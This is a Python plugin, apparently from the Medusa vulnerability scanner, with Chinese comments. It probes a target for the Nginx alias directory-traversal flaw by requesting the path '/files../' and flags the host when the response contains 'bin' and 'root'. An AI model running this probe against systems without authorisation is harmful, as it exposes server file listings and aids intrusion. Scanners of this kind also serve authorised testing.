#!/usr/bin/env python
# _*_ coding: utf-8 _*_


import urllib
import logging
import requests

def UrlProcessing(url):
    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port


Payload="/files../"
def medusa(Url,RandomAgent,ProxyIp):

    scheme, url, port = UrlProcessing(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    PayloadUrl = scheme+"://"+url+':'+str(port)+Payload
    host=url+':'+str(port)
    headers = {
        'Host':host,
        'Accept-Encoding': 'gzip, deflate',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'User-Agent': RandomAgent,
        'Connection': 'close',
    }
    s = requests.session()
    try:
        if ProxyIp!=None:
            proxies = {
                # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
                "http": "http://" + str(ProxyIp)
            }
            resp = s.get(PayloadUrl, headers=headers, proxies=proxies,timeout=5)
        elif ProxyIp==None:
            resp = s.get(PayloadUrl, headers=headers, timeout=5)
        con = resp.text
        code = resp.status_code
        if code==200 and con.lower().find('bin')!=-1 and con.lower().find('root')!=-1 :
            Medusa = "{} 存在Nginx目录穿越漏洞\r\n漏洞详情:\r\nPayload:{}\r\n".format(url, PayloadUrl)
            return(Medusa)
    except Exception as e:
        pass